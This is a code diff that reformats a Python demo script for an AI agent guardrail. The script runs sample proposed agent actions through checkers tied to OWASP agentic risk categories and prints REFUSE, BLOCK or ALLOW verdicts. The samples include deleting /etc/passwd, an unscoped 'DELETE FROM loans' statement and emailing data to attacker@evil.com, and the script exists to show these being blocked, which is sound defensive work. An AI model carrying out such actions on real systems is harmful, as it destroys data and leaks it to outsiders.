@@ -29,20 +29,38 @@ ACTIVE = "C1001"
 
 # (label, OWASP category, proposed action, findings)
 CASES = [
-    ("wrong-subject write", "ASI03 Identity Abuse",
-     'update_customer_record(C-9988)', wrong_subject({"customer_id": "C-9988"}, ACTIVE)),
-    ("destructive file delete", "ASI02 Tool Misuse",
-     'delete_file(/etc/passwd)', destructive_path({"path": "/etc/passwd"})),
-    ("unscoped SQL mutation", "ASI05 Code Execution",
-     'run_sql(DELETE FROM loans)', unscoped_sql({"sql": "DELETE FROM loans"})),
-    ("data exfiltration", "ASI01 Goal Hijack",
-     'send_email(attacker@evil.com)', data_exfiltration({"to": "attacker@evil.com"})),
-    ("coverage floor", "quality gate",
-     'merge_pr(coverage=61%)', coverage_floor(61)),
-    ("runaway action volume", "ASI08 Cascading",
-     '150 tool calls this run', action_budget(150)),
-    ("compliant write", "-",
-     'update_customer_record(C1001)', wrong_subject({"customer_id": "C1001"}, ACTIVE)),
+    (
+        "wrong-subject write",
+        "ASI03 Identity Abuse",
+        "update_customer_record(C-9988)",
+        wrong_subject({"customer_id": "C-9988"}, ACTIVE),
+    ),
+    (
+        "destructive file delete",
+        "ASI02 Tool Misuse",
+        "delete_file(/etc/passwd)",
+        destructive_path({"path": "/etc/passwd"}),
+    ),
+    (
+        "unscoped SQL mutation",
+        "ASI05 Code Execution",
+        "run_sql(DELETE FROM loans)",
+        unscoped_sql({"sql": "DELETE FROM loans"}),
+    ),
+    (
+        "data exfiltration",
+        "ASI01 Goal Hijack",
+        "send_email(attacker@evil.com)",
+        data_exfiltration({"to": "attacker@evil.com"}),
+    ),
+    ("coverage floor", "quality gate", "merge_pr(coverage=61%)", coverage_floor(61)),
+    ("runaway action volume", "ASI08 Cascading", "150 tool calls this run", action_budget(150)),
+    (
+        "compliant write",
+        "-",
+        "update_customer_record(C1001)",
+        wrong_subject({"customer_id": "C1001"}, ACTIVE),
+    ),
 ]
 
 
@@ -63,8 +81,10 @@ def main():
     for label, owasp, _action, findings in CASES:
         v = compute_verdict(findings)
         print(f"  {label:<24}{owasp:<22}{v.decision.value:<8}{_outcome(v)}")
-    print("\n  CRITICAL -> REFUSE (terminal) | ERROR -> BLOCK (retry once) | "
-          "WARNING -> ALLOW + record | clean -> ALLOW")
+    print(
+        "\n  CRITICAL -> REFUSE (terminal) | ERROR -> BLOCK (retry once) | "
+        "WARNING -> ALLOW + record | clean -> ALLOW"
+    )
 
 
 if __name__ == "__main__":
